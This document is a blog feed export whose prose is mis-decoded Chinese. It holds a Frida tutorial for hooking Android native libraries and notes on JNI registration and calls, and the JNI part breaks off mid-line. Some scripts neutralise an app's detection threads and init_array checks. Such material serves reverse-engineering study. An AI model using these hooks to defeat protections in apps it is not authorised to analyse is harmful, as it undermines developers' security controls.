ç¤ºä¾‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Java.perform(function(){ // è·å–å‡½æ•°åœ°å€ var funcAddr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;).add(0x23F4); // å£°æ˜å‡½æ•°æŒ‡é’ˆ var func = new NativeFunction(funcAddr, \u0026#34;pointer\u0026#34;, [\u0026#39;pointer\u0026#39;, \u0026#39;pointer\u0026#39;]); var env = Java.vm.tryGetEnv(); console.log(\u0026#34;env: \u0026#34;, JSON.stringify(env)); if (env !== null) { var jstr = env.newStringUtf(\u0026#34;Je2em1ah is very good!!!\u0026#34;); var cstr = func(env, jstr); console.log(cstr.readCString()); console.log(hexdump(cstr)); } }); Hook libc è¯»å†™æ–‡ä»¶ 1. ä½¿ç”¨ Frida API å†™æ–‡ä»¶ 1 2 3 4 var file = new File(\u0026#34;/sdcard/xxxx.txt\u0026#34;, \u0026#34;w\u0026#34;); file.write(\u0026#34;Je2em1ah is very good!!!\\n\u0026#34;); file.flush(); file.close(); 2. Hook libc å†™æ–‡ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 var addr_fopen = Module.findExportByName(\u0026#34;libc.so\u0026#34;, \u0026#34;fopen\u0026#34;); var addr_fputs = Module.findExportByName(\u0026#34;libc.so\u0026#34;, \u0026#34;fputs\u0026#34;); var addr_fclose = Module.findExportByName(\u0026#34;libc.so\u0026#34;, \u0026#34;fclose\u0026#34;); console.log(\u0026#34;addr_fopen:\u0026#34;, addr_fopen, \u0026#34;addr_fputs:\u0026#34;, addr_fputs, \u0026#34;addr_fclose:\u0026#34;, addr_fclose); var fopen = new NativeFunction(addr_fopen, \u0026#34;pointer\u0026#34;, [\u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34;]); var fputs = new NativeFunction(addr_fputs, \u0026#34;int\u0026#34;, [\u0026#34;pointer\u0026#34;, \u0026#34;pointer\u0026#34;]); var fclose = new NativeFunction(addr_fclose, \u0026#34;int\u0026#34;, [\u0026#34;pointer\u0026#34;]); var filename = Memory.allocUtf8String(\u0026#34;/sdcard/xxx.txt\u0026#34;); // æ³¨æ„ï¼šsdcard æƒé™ä¸è¶³å¯èƒ½å¯¼è‡´å†™å…¥å¤±è´¥ var open_mode = Memory.allocUtf8String(\u0026#34;w\u0026#34;); var file = fopen(filename, open_mode); console.log(\u0026#34;fopen:\u0026#34;, file); var buffer = Memory.allocUtf8String(\u0026#34;Jeremiah\\n\u0026#34;); var retval = fputs(buffer, file); console.log(\u0026#34;fputs:\u0026#34;, retval); fclose(file); JNI å‡½æ•°çš„ Hook 1. Hook libart æ¥ Hook JNI ç›¸å…³å‡½æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var artSym = Module.enumerateSymbols(\u0026#34;libart.so\u0026#34;); // åŸå…ˆçš„ API var NewStringUTFAddr = null; for (var i = 0; i \u0026lt; artSym.length; i++) { if (artSym[i].name.indexOf(\u0026#34;CheckJNI\u0026#34;) === -1 \u0026amp;\u0026amp; artSym[i].name.indexOf(\u0026#34;NewStringUTF\u0026#34;) !== -1) { NewStringUTFAddr = artSym[i].address; } } if (NewStringUTFAddr !== null) { Interceptor.attach(NewStringUTFAddr, { onEnter: function(args){ console.log(args[1].readCString()); }, onLeave: function(retval){ // å¯é€‰ï¼šåœ¨éœ€è¦æ—¶æ·»åŠ å¤„ç†é€»è¾‘ } }); } 2. è®¡ç®—åœ°å€æ–¹å¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Java.perform(function(){ console.log(\u0026#34;Process.arch: \u0026#34;, Process.arch); var envAddr = ptr(Java.vm.tryGetEnv().handle).readPointer(); // è·å– JNIEnv çš„åœ°å€ var newStringUtfAddr = envAddr.add(0x538).readPointer(); console.log(\u0026#34;newStringUtfAddr\u0026#34;, newStringUtfAddr); if (newStringUtfAddr !== null) { Interceptor.attach(newStringUtfAddr, { onEnter: function(args){ console.log(args[1].readCString()); }, onLeave: function(retval){ // å¯é€‰ï¼šåœ¨éœ€è¦æ—¶æ·»åŠ å¤„ç†é€»è¾‘ } }); } }); ä¸»åŠ¨è°ƒç”¨ JNI å‡½æ•° 1. ä½¿ç”¨ Frida å°è£…çš„å‡½æ•°è°ƒç”¨ JNI 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var funcAddr = Module.findExportByName(\u0026#34;libxxx.so\u0026#34;, \u0026#34;functionName\u0026#34;); console.log(funcAddr); if (funcAddr !== null) { Interceptor.attach(funcAddr, { onEnter: function(args){ // å…¥å‚å¤„ç† }, onLeave: function(retval){ var env = Java.vm.tryGetEnv(); var jstr = env.newStringUtf(\u0026#34;bbs.125.la\u0026#34;); // ä¸»åŠ¨è°ƒç”¨ JNI å‡½æ•°ï¼šCSTR è½¬ JSTR retval.replace(jstr); var cstr = env.getStringUtfChars(jstr); // ä¸»åŠ¨è°ƒç”¨ JNI å‡½æ•°ï¼šJSTR è½¬ CSTR console.log(cstr.readCString()); console.log(hexdump(cstr)); } }); } 2. ä½¿ç”¨ NativeFunction ä¸»åŠ¨è°ƒç”¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 var symbols = Process.getModuleByName(\u0026#34;libart.so\u0026#34;).enumerateSymbols(); var newStringUtf = null; for (let i = 0; i \u0026lt; symbols.length; i++) { var symbol = symbols[i]; if (symbol.name.indexOf(\u0026#34;CheckJNI\u0026#34;) === -1 \u0026amp;\u0026amp; symbol.name.indexOf(\u0026#34;NewStringUTF\u0026#34;) !== -1) { console.log(symbol.name, symbol.address); newStringUtf = symbol.address; } } var newStringUtf_func = new NativeFunction(newStringUtf, \u0026#39;pointer\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;pointer\u0026#39;]); var jstring = newStringUtf_func(Java.vm.tryGetEnv().handle, Memory.allocUtf8String(\u0026#34;Je2em1ah\u0026#34;)); console.log(jstring); var envAddr = Java.vm.tryGetEnv().handle.readPointer(); var GetStringUTFChars = envAddr.add(0x548).readPointer(); var GetStringUTFChars_func = new NativeFunction(GetStringUTFChars, \u0026#39;pointer\u0026#39;, [\u0026#39;pointer\u0026#39;, \u0026#39;pointer\u0026#39;, \u0026#39;pointer\u0026#39;]); var cstr = GetStringUTFChars_func(Java.vm.tryGetEnv().handle, jstring, ptr(0)); console.log(cstr.readCString()); SO å±‚æ‰“å°å‡½æ•°è°ƒç”¨æ ˆ é€šè¿‡ Hook ç³»ç»Ÿå‡½æ•°ï¼Œæ‰“å°å‡½æ•°æ ˆï¼Œå¯ä»¥å¿«é€Ÿå®šä½åˆ°å…³é”®ä»£ç ã€‚ Frida æä¾›äº† SO å±‚æ‰“å°å‡½æ•°æ ˆçš„æ–¹æ³•ï¼š 1 console.log(Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(\u0026#39;\\n\u0026#39;) + \u0026#39;\\n\u0026#39;); // `ACCURATE` è¡¨ç¤ºç²¾ç¡®ï¼Œ`FUZZY` è¡¨ç¤ºæ¨¡ç³Š å®šä½é™æ€æ³¨å†Œå‡½æ•°çš„æ–¹æ³• é™æ€æ³¨å†Œçš„å‡½æ•°ä¼šé€šè¿‡ dlsym æŸ¥æ‰¾ç¬¦å·ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ Hook dlsym å‡½æ•°æ¥å¿«é€Ÿå®šä½ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function hook_dlsym(){ var dlsymAddr = Module.findExportByName(\u0026#34;libdl.so\u0026#34;, \u0026#34;dlsym\u0026#34;); console.log(dlsymAddr); if (dlsymAddr !== null) { Interceptor.attach(dlsymAddr, { onEnter: function(args){ this.args1 = args[1]; }, onLeave: function(retval){ var module = findModuleByAddress(retval); console.log(this.args1.readCString(), retval, module.name, retval.sub(module.base)); } }); } } å®šä½åŠ¨æ€æ³¨å†Œå‡½æ•°çš„æ–¹æ³• åŠ¨æ€æ³¨å†Œçš„å‡½æ•°ä¼šé€šè¿‡ RegisterNatives å‡½æ•°åŠ è½½ï¼Œå› æ­¤ Hook RegisterNatives å¯ä»¥å¿«é€Ÿå®šä½å‡½æ•°ä½ç½®ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 function hook_RegisterNatives() { var RegisterNatives_addr = null; var symbols = Process.findModuleByName(\u0026#34;libart.so\u0026#34;).enumerateSymbols(); for (var i = 0; i \u0026lt; symbols.length; i++) { var symbol = symbols[i].name; if (symbol.indexOf(\u0026#34;CheckJNI\u0026#34;) === -1 \u0026amp;\u0026amp; symbol.indexOf(\u0026#34;JNI\u0026#34;) \u0026gt;= 0) { if (symbol.indexOf(\u0026#34;RegisterNatives\u0026#34;) \u0026gt;= 0) { RegisterNatives_addr = symbols[i].address; console.log(\u0026#34;RegisterNatives_addr: \u0026#34;, RegisterNatives_addr); } } } if (RegisterNatives_addr !== null) { Interceptor.attach(RegisterNatives_addr, { onEnter: function (args) { var env = args[0]; var jclass = args[1]; var class_name = Java.vm.tryGetEnv().getClassName(jclass); var methods_ptr = ptr(args[2]); var method_count = args[3].toInt32(); console.log(\u0026#34;RegisterNatives method counts: \u0026#34;, method_count); for (var i = 0; i \u0026lt; method_count; i++) { var name = methods_ptr.add(i * Process.pointerSize * 3).readPointer().readCString(); var sig = methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize).readPointer().readCString(); var fnPtr_ptr = methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize * 2).readPointer(); var find_module = Process.findModuleByAddress(fnPtr_ptr); console.log(\u0026#34;RegisterNatives java_class: \u0026#34;, class_name, \u0026#34;name: \u0026#34;, name, \u0026#34;sig: \u0026#34;, sig, \u0026#34;fnPtr: \u0026#34;, fnPtr_ptr, \u0026#34;module_name: \u0026#34;, find_module.name, \u0026#34;module_base: \u0026#34;, find_module.base, \u0026#34;offset: \u0026#34;, ptr(fnPtr_ptr).sub(find_module.base)); } }, onLeave: function (retval) {} }); } } Frida InlineHook 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 function inlineHook() { // ç¤ºä¾‹ 1 /* var nativePointer = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); var hookAddr = nativePointer.add(0x17BC); Interceptor.attach(hookAddr, { onEnter: function (args) { console.log(\u0026#34;onEnter: \u0026#34;, this.context.x8); }, onLeave: function (retval) { console.log(\u0026#34;onLeave: \u0026#34;, this.context.x8.toInt32()); console.log(this.context.x8 \u0026amp; 7); } }); */ // ç¤ºä¾‹ 2 var nativePointer = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); var hookAddr = nativePointer.add(0x1B70); Interceptor.attach(hookAddr, { onEnter: function (args) { console.log(\u0026#34;onEnter: \u0026#34;, this.context.x1); console.log(\u0026#34;onEnter: \u0026#34;, hexdump(this.context.x1)); }, onLeave: function (retval) { // å¯é€‰ï¼šåœ¨éœ€è¦æ—¶æ·»åŠ å¤„ç†é€»è¾‘ } }); } Hook init or initArray SO ä¸­ init æ®µå’Œ initarray æ®µçš„åŠ è½½æ—¶æœºæ˜¯åœ¨ dlopen å‡½æ•°ä¸­è¿›è¡ŒåŠ è½½ï¼Œå› æ­¤éœ€åœ¨ dlopen æ‰§è¡Œæ—¶ç›‘æ§ SO çš„åŠ è½½å¹¶åŒæ—¶ Hook init å’Œ initarrayã€‚ init å’Œ initarray é€šè¿‡ linker æˆ– linker64 æ–‡ä»¶çš„ call_constructors å‡½æ•°è¿›è¡Œè°ƒç”¨ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 function hook_dlopen(){ var dlopen = Module.findExportByName(null, \u0026#34;dlopen\u0026#34;); console.log(dlopen); if (dlopen !== null) { Interceptor.attach(dlopen, { onEnter: function(args){ var soName = args[0].readCString(); console.log(soName); if (soName.indexOf(\u0026#34;libxxx.so\u0026#34;) !== -1) { hook_initarray(); } }, onLeave: function(retval){} }); } var android_dlopen_ext = Module.findExportByName(null, \u0026#34;android_dlopen_ext\u0026#34;); console.log(android_dlopen_ext); if (android_dlopen_ext !== null) { Interceptor.attach(android_dlopen_ext, { onEnter: function(args){ var soName = args[0].readCString(); console.log(soName); if (soName.indexOf(\u0026#34;libxxx.so\u0026#34;) !== -1) { hook_initarray(); } }, onLeave: function(retval){} }); } } var hooked = false; function hook_initarray(){ var call_constructorsAddr = null; var linkerSymbols = Module.enumerateSymbolsSync(\u0026#34;linker64\u0026#34;); // å¯èƒ½æ˜¯ linker æˆ– linker64 for (var i = 0; i \u0026lt; linkerSymbols.length; i++) { if (linkerSymbols[i].name === \u0026#34;__dl__ZN6soinfo17call_constructorsEv\u0026#34;) { call_constructorsAddr = linkerSymbols[i].address; console.log(linkerSymbols[i].name, linkerSymbols[i].address); } } if (call_constructorsAddr !== null \u0026amp;\u0026amp; !hooked) { Interceptor.attach(call_constructorsAddr, { onEnter: function(args){ var soAddr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;); var initArrayTest2 = soAddr.add(0x2B08); var initArrayTest1 = soAddr.add(0x2AD8); Interceptor.replace(initArrayTest2, new NativeCallback(function(a){}, \u0026#34;int\u0026#34;, [\u0026#39;int\u0026#39;])); Interceptor.replace(initArrayTest1, new NativeCallback(function(a){}, \u0026#34;int\u0026#34;, [\u0026#39;int\u0026#39;])); hooked = true; }, onLeave: function(retval){} }); } } function main(){ hook_dlopen(); } setImmediate(main); Hook JNI_OnLoad æ³¨å…¥ç‚¹åœ¨ dlopen åŠ è½½ ç»“æŸ ä¹‹åã€‚ 1 2 3 4 5 6 7 8 9 10 11 function hook_JNI_Onload(){ var JNI_Onload = Module.findExportByName(\u0026#34;libxxx.so\u0026#34;, \u0026#34;JNI_OnLoad\u0026#34;); if (JNI_Onload !== null) { Interceptor.attach(JNI_Onload, { onEnter: function(args){ console.log(\u0026#34;JNI_OnLoad is called\u0026#34;); }, onLeave: function(retval){} }); } } Hook pthread_create ä¸€äº› æ£€æµ‹å‡½æ•° éœ€è¦ å®æ—¶ è¿è¡Œï¼Œå¯èƒ½ä¼šä½¿ç”¨ pthread å¼€å¯å­çº¿ç¨‹ã€‚ Hook pthread_create å¯æŸ¥çœ‹å¼€å¯äº†å“ªäº›å­çº¿ç¨‹ï¼Œå¹¶å¯å¹²æ‰ä¸æ£€æµ‹ç›¸å…³çš„å­çº¿ç¨‹ã€‚ å‡½æ•°åŸå‹ 1 int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine)(void *), void *arg); pthread_t *thread\næŒ‡å‘ pthread_t ç±»å‹å˜é‡çš„æŒ‡é’ˆï¼Œç”¨äºè¿”å›æ–°åˆ›å»ºçº¿ç¨‹çš„æ ‡è¯†ç¬¦ã€‚\nconst pthread_attr_t *attr\næŒ‡å‘çº¿ç¨‹å±æ€§å¯¹è±¡çš„æŒ‡é’ˆï¼Œç”¨äºè®¾ç½®çº¿ç¨‹çš„å±æ€§ï¼ˆå¦‚æ ˆå¤§å°ã€è°ƒåº¦ç­–ç•¥ç­‰ï¼‰ã€‚å¦‚æœä½¿ç”¨é»˜è®¤å±æ€§ï¼Œå¯ä»¥ä¼ é€’ NULLã€‚\nvoid *(*start_routine)(void *)\nçº¿ç¨‹çš„èµ·å§‹å‡½æ•°ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ªè¿”å› void* å¹¶æ¥å—ä¸€ä¸ª void* ç±»å‹å‚æ•°çš„å‡½æ•°æŒ‡é’ˆã€‚\nvoid *arg\nä¼ é€’ç»™ start_routine å‡½æ•°çš„å‚æ•°ï¼Œå¯ä»¥æ˜¯ä»»æ„ç±»å‹çš„æŒ‡é’ˆã€‚å¦‚æœä¸éœ€è¦å‚æ•°ï¼Œå¯ä»¥ä¼ é€’ NULLã€‚\nHook å®ç° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function hook_pthread_create(){ var pthread_create_addr = Module.findExportByName(\u0026#34;libc.so\u0026#34;, \u0026#34;pthread_create\u0026#34;); console.log(\u0026#34;pthread_create_addr: \u0026#34;, pthread_create_addr); if (pthread_create_addr !== null) { Interceptor.attach(pthread_create_addr, { onEnter: function(args){ console.log(\u0026#34;pthread_t *thread:\u0026#34;, args[0]); console.log(\u0026#34;const pthread_attr_t *attr:\u0026#34;, args[1]); console.log(\u0026#34;void *(*start_routine)(void *):\u0026#34;, args[2]); console.log(\u0026#34;void *arg:\u0026#34;, args[3]); }, onLeave: function(retval){ console.log(\u0026#34;pthread_create retval:\u0026#34;, retval); } }); } } å†…å­˜è¯»å†™ç›‘æ§ é€šè¿‡ Process.setExceptionHandler æä¾›ä¸€ä¸ªå›è°ƒå‡½æ•°æ¥ ç›‘æ§å†…å­˜çš„è¯»å†™æ“ä½œã€‚è¿™ç§æ–¹æ³•å¯ä»¥å¸®åŠ©å¼€å‘è€…åœ¨ç‰¹å®šå†…å­˜åœ°å€å‘ç”Ÿè¯»å†™æ—¶æ•è·å¼‚å¸¸ï¼Œä»è€Œè¿›è¡Œè°ƒè¯•æˆ–é€†å‘åˆ†æã€‚\nå®ç°æ­¥éª¤ 1. Hook dlopen å‡½æ•°ä»¥ç›‘æ§ SO æ–‡ä»¶çš„åŠ è½½ é¦–å…ˆï¼Œé€šè¿‡ Hook dlopen å’Œ android_dlopen_ext å‡½æ•°ï¼Œç›‘æ§ç›®æ ‡ SO æ–‡ä»¶çš„åŠ è½½ã€‚ä¸€æ—¦æ£€æµ‹åˆ°æŒ‡å®šçš„ SO æ–‡ä»¶è¢«åŠ è½½ï¼Œå³å¯æ‰§è¡Œç›¸åº”çš„å›è°ƒå‡½æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 function hook_dlopen(addr, soName, callback) { Interceptor.attach(addr, { onEnter: function (args) { var soPath = args[0].readCString(); if (soPath.indexOf(soName) !== -1) { this.hook = true; } }, onLeave: function (retval) { if (this.hook) { callback(); } } }); } var dlopen = Module.findExportByName(\u0026#34;libdl.so\u0026#34;, \u0026#34;dlopen\u0026#34;); var android_dlopen_ext = Module.findExportByName(\u0026#34;libdl.so\u0026#34;, \u0026#34;android_dlopen_ext\u0026#34;); hook_dlopen(dlopen, \u0026#34;libxxx.so\u0026#34;, set_read_write_break); hook_dlopen(android_dlopen_ext, \u0026#34;libxxx.so\u0026#34;, set_read_write_break); 2. è®¾ç½®å¼‚å¸¸å¤„ç†å™¨ä»¥ç›‘æ§å†…å­˜è¯»å†™ é€šè¿‡ Process.setExceptionHandlerï¼Œè®¾ç½®ä¸€ä¸ªå¼‚å¸¸å¤„ç†å™¨ï¼Œå½“ç›®æ ‡å†…å­˜åœ°å€çš„è¯»å†™æ“ä½œè§¦å‘å¼‚å¸¸æ—¶ï¼Œå›è°ƒå‡½æ•°å°†è¢«è°ƒç”¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 function set_read_write_break(){ Process.setExceptionHandler(function(details) { // é”™è¯¯å›è°ƒå‡½æ•° console.log(JSON.stringify(details, null, 2)); console.log(\u0026#34;lr:\u0026#34;, DebugSymbol.fromAddress(details.context.lr)); console.log(\u0026#34;pc:\u0026#34;, DebugSymbol.fromAddress(details.context.pc)); // è·å–å®Œæˆä¿¡æ¯ä¹‹åå°†å†…å­˜æƒé™å¤åŸ Memory.protect(details.memory.address, Process.pointerSize, \u0026#39;rwx\u0026#39;); // æ‰“å°è°ƒç”¨æ ˆ console.log(Thread.backtrace(details.context, Backtracer.ACCURATE) .map(DebugSymbol.fromAddress) .join(\u0026#39;\\n\u0026#39;) + \u0026#39;\\n\u0026#39;); return true; // ç»§ç»­æ‰§è¡Œ }); // ç›®æ ‡å†…å­˜åœ°å€ var addr = Module.findBaseAddress(\u0026#34;libxxx.so\u0026#34;).add(0x3DED); // ä¿®æ”¹å†…å­˜æƒé™ä¸ºä¸å¯è¯»å†™ï¼Œåªèƒ½æ‰§è¡Œï¼Œè§¦å‘å¼‚å¸¸ Memory.protect(addr, 8, \u0026#39;---\u0026#39;); } ç›¸å…³çŸ¥è¯†æ‹“å±• Process.setExceptionHandler çš„ä½œç”¨ Process.setExceptionHandler ç”¨äºè®¾ç½®ä¸€ä¸ªå…¨å±€çš„å¼‚å¸¸å¤„ç†å™¨ï¼Œå½“ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œè¯¥å¤„ç†å™¨ä¼šè¢«è°ƒç”¨ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥æ•è·å†…å­˜è®¿é—®è¿è§„ç­‰å¼‚å¸¸ï¼Œè¿›è¡Œè°ƒè¯•æˆ–é€†å‘åˆ†æã€‚\n","date":"2025-01-01T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501012305144.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/fridahookso/","title":"FridaHookSo"},{"content":"Soç›¸å…³çŸ¥è¯†å­¦ä¹  JNIå‡½æ•°çš„é™æ€æ³¨å†Œ å¿…é¡»éµå¾ªä¸€å®šçš„å‘½åè§„åˆ™ï¼Œä¸€èˆ¬æ˜¯ Java_åŒ…å_ç±»å_æ–¹æ³•å\nç³»ç»Ÿä¼šé€šè¿‡ dlopen åŠ è½½å¯¹åº”çš„ SOï¼Œé€šè¿‡ dlsym æ¥è·å–æŒ‡å®šåå­—çš„å‡½æ•°åœ°å€ï¼Œç„¶åè°ƒç”¨é™æ€æ³¨å†Œçš„ JNI å‡½æ•°ï¼Œå¿…ç„¶åœ¨å¯¼å‡ºè¡¨é‡Œ\nç¼–è¯‘ SO çš„æ—¶å€™ä¸ä¼šç»™å¯¹åº” JNI å‡½æ•°å…·ä½“åœ°å€ï¼Œåœ¨ ç¬¬ä¸€æ¬¡è°ƒç”¨ çš„æ—¶å€™æ‰ä¼šæœ‰å…·ä½“åœ°å€\nJNIå‡½æ•°çš„åŠ¨æ€æ³¨å†Œ é€šè¿‡ env-\u0026gt;RegisterNatives æ³¨å†Œå‡½æ•°ï¼Œé€šå¸¸åœ¨ JNI_OnLoad ä¸­æ³¨å†Œ JNINativeMethod\nå‡½æ•°ç­¾å\nå¯ä»¥ç»™åŒä¸€ä¸ª Java å‡½æ•°æ³¨å†Œå¤šä¸ª native å‡½æ•°ï¼Œä»¥æœ€åä¸€æ¬¡ä¸ºå‡†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 jclass MainActivityClazz = env-\u0026gt;FindClass(\u0026#34;com/Jeremiah/ndk/NDKMain\u0026#34;); /* typedef struct { // JNINativeMethod ç»“æ„ä½“çš„å®ç° const char* name; // Javaå±‚å¯¹åº”æ–¹æ³•å const char* signature; // å‡½æ•°ç­¾å void* fnptr; // å‡½æ•°æŒ‡é’ˆï¼ˆå³SOä¸­å‡½æ•°çš„åœ°å€ï¼‰ } JNINativeMethod; */ JNINativeMethod methods[] = { {\u0026#34;encode\u0026#34;, \u0026#34;(ILjava/lang/String;[B)Ljava/lang/String;\u0026#34;, (void *)encodeFromC}, }; env-\u0026gt;RegisterNatives(MainActivityClazz, methods, sizeof(methods)/sizeof(JNINativeMethod)); JNI_Onloadå®šä¹‰ 1 2 3 4 5 6 7 8 9 10 11 JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) { JNIEnv *env = nullptr; if (vm-\u0026gt;GetEnv((void **) \u0026amp;env, JNI_VERSION_1_6) != JNI_OK) { LOGD(\u0026#34;GetEnv failed\u0026#34;); return -1; } return JNI_VERSION_1_6; } // ä¸€ä¸ª SO ä¸­å¯ä»¥ä¸å®šä¹‰ JNI_OnLoad // ä¸€æ—¦å®šä¹‰äº† JNI_OnLoadï¼Œåœ¨ SO è¢«åŠ è½½çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œ // å¿…é¡»è¿”å› JNI ç‰ˆæœ¬ JNI_VERSION_1_6 SOä¹‹é—´çš„ç›¸äº’è°ƒç”¨ ä½¿ç”¨ dlopen, dlsym, dlclose è·å–å‡½æ•°åœ°å€ï¼Œç„¶åè°ƒç”¨ã€‚éœ€è¦å¯¼å…¥ dlfcn.h\ndlopen ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦åŠ è½½çš„ SO çš„ ç»å¯¹è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º ç¬¦å·è§£æçš„æ—¶æœºï¼Œè¿”å›å€¼ä¸ºè¯¥ SO çš„ä¸€ä¸ª å¥æŸ„\ndlsym ç¬¬ä¸€ä¸ªå‚æ•°ä¸º dlopen è¿”å›çš„ åº“å¥æŸ„ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦æŸ¥æ‰¾çš„ ç¬¦å·çš„åå­—ï¼Œè¿”å›å€¼ä¸º è¯¥ç¬¦å·çš„æŒ‡é’ˆ\nreinterpret_cast\u0026lt;void (*)(char *) ä¸º C++ ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºä¸¤ä¸ªä¸åŒç±»å‹æŒ‡é’ˆçš„å¼ºåˆ¶è½¬æ¢\n1 2 3 4 void *soinfo = dlopen(nativePath, RTLD_NOW); void (*def)(char* str) = nullptr; def = reinterpret_cast\u0026lt;void (*)(char *)\u0026gt;(dlsym(soinfo, \u0026#34;_Z7fromSoBPc\u0026#34;)); def(\u0026#34;Jeremiah\u0026#34;); extern å‡½æ•°å£°æ˜ SOè·¯å¾„çš„åŠ¨æ€è·å– 32 å’Œ 64 çš„ SO å­˜æ”¾è·¯å¾„ä¸ä¸€æ ·ï¼Œä¸ºäº†æ›´åŠ é€šç”¨ï¼Œå¯ä»¥ç”¨ä»£ç åŠ¨æ€è·å– SO è·¯å¾„ 1 2 3 4 5 6 7 8 9 10 11 12 13 public String getPath(Context cxt){ PackageManager pm = cxt.getPackageManager(); List\u0026lt;PackageInfo\u0026gt; pkgList = pm.getInstalledPackages(0); if (pkgList == null || pkgList.size() == 0) return null; for (PackageInfo pi : pkgList) { if (pi.applicationInfo.nativeLibraryDir.startsWith(\u0026#34;/data/app/\u0026#34;) // è·¯å¾„ \u0026amp;\u0026amp; pi.packageName.startsWith(\u0026#34;com.Jeremiah.test\u0026#34;)) { // åŒ…å // Log.e(\u0026#34;Jeremiah\u0026#34;, pi.applicationInfo.nativeLibraryDir); return pi.applicationInfo.nativeLibraryDir; } } return null; } é€šè¿‡JNIåˆ›å»ºJavaå¯¹è±¡ NewObject åˆ›å»ºå¯¹è±¡\n1 2 3 4 jclass clazz = env-\u0026gt;FindClass(\u0026#34;com/Jeremiah/ndk/NDKDemo\u0026#34;); jmethodID methodID = env-\u0026gt;GetMethodID(clazz, \u0026#34;\u0026lt;init\u0026gt;\u0026#34;, \u0026#34;()V\u0026#34;); jobject ReflectDemoObj = env-\u0026gt;NewObject(clazz, methodID); LOGD(\u0026#34;ReflectDemoObj %p\u0026#34;, ReflectDemoObj); AllocObject åˆ›å»ºå¯¹è±¡\n1 2 3 4 5 jclass clazz = env-\u0026gt;FindClass(\u0026#34;com/Jeremiah/ndk/NDKDemo\u0026#34;); jmethodID methodID2 = env-\u0026gt;GetMethodID(clazz, \u0026#34;\u0026lt;init\u0026gt;\u0026#34;, \u0026#34;(Ljava/lang/String;I)V\u0026#34;); jobject ReflectDemoObj2 = env-\u0026gt;AllocObject(clazz); jstring jstr = env-\u0026gt;NewStringUTF(\u0026#34;from jni str\u0026#34;); env-\u0026gt;CallNonvirtualVoidMethod(ReflectDemoObj2, clazz, methodID2, jstr, 100); é€šè¿‡JNIè®¿é—®Javaå±æ€§ è·å–é™æ€å­—æ®µ\n1 2 3 4 5 6 7 8 jfieldID privateStaticStringField = env-\u0026gt;GetStaticFieldID(clazz, \u0026#34;privateStaticStringField\u0026#34;, \u0026#34;Ljava/lang/String;\u0026#34;); jstring privateStaticString = static_cast\u0026lt;jstring\u0026gt;(env-\u0026gt;GetStaticObjectField(clazz, privateStaticStringField)); const char* privatecstr = env-\u0026gt;GetStringUTFChars(privateStaticString, nullptr); LOGD(\u0026#34;privateStaticString: %s\u0026#34;, privatecstr); env-\u0026gt;ReleaseStringUTFChars(privateStaticString, privatecstr); è·å–å¯¹è±¡å­—æ®µ\n1 2 3 4 5 6 7 jfieldID publicStringField = env-\u0026gt;GetFieldID(clazz, \u0026#34;publicStringField\u0026#34;, \u0026#34;Ljava/lang/String;\u0026#34;); jstring publicString = static_cast\u0026lt;jstring\u0026gt;(env-\u0026gt;GetObjectField(ReflectDemoObj, publicStringField)); const char* publiccstr = env-\u0026gt;GetStringUTFChars(publicString, nullptr); LOGD(\u0026#34;publicStringField: %s\u0026#34;, publiccstr); è®¾ç½®å­—æ®µ\n1 env-\u0026gt;SetObjectField(ndkobj, privateStringFieldID, env-\u0026gt;NewStringUTF(\u0026#34;Jeremiah\u0026#34;)); é€šè¿‡JNIè®¿é—®Javaæ•°ç»„ è·å–æ•°ç»„å­—æ®µID\n1 2 3 4 jfieldID byteArrayID = env-\u0026gt;GetFieldID(clazz, \u0026#34;byteArray\u0026#34;, \u0026#34;[B\u0026#34;); jbyteArray byteArray = static_cast\u0026lt;jbyteArray\u0026gt;(env-\u0026gt;GetObjectField(ReflectDemoObj, byteArrayID)); int _byteArrayLength = env-\u0026gt;GetArrayLength(byteArray); // 